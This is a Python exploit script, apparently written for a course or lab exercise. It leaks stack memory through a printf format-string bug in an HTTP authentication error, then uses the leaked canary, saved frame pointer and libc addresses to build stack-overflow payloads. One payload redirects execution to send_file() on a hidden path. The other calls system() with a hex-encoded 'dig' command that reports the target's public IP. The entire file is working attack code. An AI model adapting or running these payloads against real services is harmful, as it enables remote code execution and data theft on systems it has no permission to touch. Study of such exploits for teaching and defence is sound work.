import binascii
import subprocess


def reverse(word):
    reversed = bytearray.fromhex(word)
    reversed.reverse()
    reversed = ''.join(format(x, '02x') for x in reversed)

    return reversed.upper()

# Call leakAddr.sh to get stack info using vulnerable printf
process = subprocess.Popen(['./leakAddr.sh'],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE)
stdout, stderr = process.communicate()
result = (str(stderr).split("Basic realm=\"Invalid user: ", 1)
          [1]).split("\"", 1)[0]
memory = [result[y-8:y] for y in range(8, len(result)+8, 8)]
libc = memory[23]
canary1 = memory[26].replace("00", "3D", 1)
canary2 = memory[28]
ebp = memory[29]
ret_address = memory[30]

payload = 'A'*56

# Replicate the given argument of "post_param"
partial = int(ret_address, 16)
partial = partial + 4885
partial = ("0x%0.8X" % partial).replace('0x', '').upper()
payload += reverse(partial)
payload += 'A'*40

# Set address to the buffer
partial = int(ebp, 16)
partial = partial - 136
partial = ("0x%0.8X" % partial).replace('0x', '').upper()
payload += reverse(partial)

# Set cannary and saved ebp
payload += 'A'*8
payload += reverse(canary1)
payload += reverse(canary2)
payload += 'A'*8
payload += reverse(ebp)

# The base of the payload is complete
# Split the payloads to add the part that differs
payload1 = payload
payload2 = payload

# Add the address to send_file() to the first payload
partial = int(ret_address, 16)
partial = partial + 1651 # Offset calculated 
partial = ("0x%0.8X" % partial).replace('0x', '').upper()
payload1 += reverse(partial)

# Add the address to system() to the second payload
partial = int(libc, 16)
partial = partial - 211975
partial = ("0x%0.8X" % partial).replace('0x', '').upper()
payload2 += reverse(partial)

# create argument address for send file
payload1 += 'A'*8
payload2 += 'A'*8
partial = int(ebp, 16)
partial = partial - 48
partial = ("0x%0.8X" % partial).replace('0x', '').upper()
payload1 += reverse(partial)
payload2 += reverse(partial)

payload1 += "2F73656365742F7900"
payload2 += "646967202b73686f7274206d7969702e6f70656e646e732e636f6d20407265736f6c766572312e6f70656e646e732e636f6d0000"

payloadBin = binascii.unhexlify(payload1)
with open("part5.bin", "wb") as f:
    f.write(payloadBin)

payloadBin = binascii.unhexlify(payload2)
with open("part6.bin", "wb") as f:
    f.write(payloadBin)

process = subprocess.Popen(['./apply.sh', "5"],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE)
stdout, stderr = process.communicate()
planY = stdout.decode('utf-8')
print("----------------------------------------Part 5----------------------------------------")
print("Plan Y results: " + planY)

process = subprocess.Popen(['./apply.sh', "6"],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE)
stdout, stderr = process.communicate()
planZ = stdout.decode('utf-8')
print("----------------------------------------Part 6----------------------------------------")
print("Public IP: " + planZ)
